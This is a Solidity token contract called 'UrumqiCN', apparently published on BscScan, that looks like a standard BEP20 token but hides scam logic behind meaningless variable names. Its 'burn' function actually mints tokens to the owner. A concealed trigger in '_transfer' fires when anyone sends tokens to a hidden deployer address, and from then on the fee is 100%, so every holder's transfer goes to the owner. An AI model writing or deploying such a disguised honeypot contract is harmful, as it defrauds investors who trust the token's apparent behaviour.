/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

//
//https://twitter.com/china_protest
//https://t.me/metavill_global
//
// SPDX-License-Identifier: MIT
pragma solidity =0.7.5;
contract UrumqiCN {
address public  utxALu = address(0);
uint256 public  VcPtOT = 100000000000000000000000;
uint256 private  kmsHlY = 10000000000000;
address public  tOZbZf = address(0);
uint256 public  mYQlwR = 1000000000000000000;
uint256 public  jYXqMO = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  bMVuKv = 10000000000000000000;
address public  ubQphN = address(0);
address private  OXAysk = address(0);
address public  CRCNdJ = address(0);
uint256 public constant UfvsmO = 9+1;
address public  xqPBgM = address(0);
uint256 public  lcvZny = 10000000000000000000000000000;
uint256 public  NziSka = 100000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  xLgvXJ = 100000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
uint256 public  BJMKQe = 100000000000000000000000;
string public  name = "UrumqiCN";
address public  knwNVY = address(0);
mapping (address => uint256) public balanceOf;
string public  symbol = "UrumqiCN";
uint256 public constant totalSupply = 100000000000000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
OXAysk = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CAYQyI");
require(to != address(0), "CAYQyI");
require(amount <= balanceOf[from], "CAYQyI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UfvsmO/kmsHlY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OXAysk){
kmsHlY = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}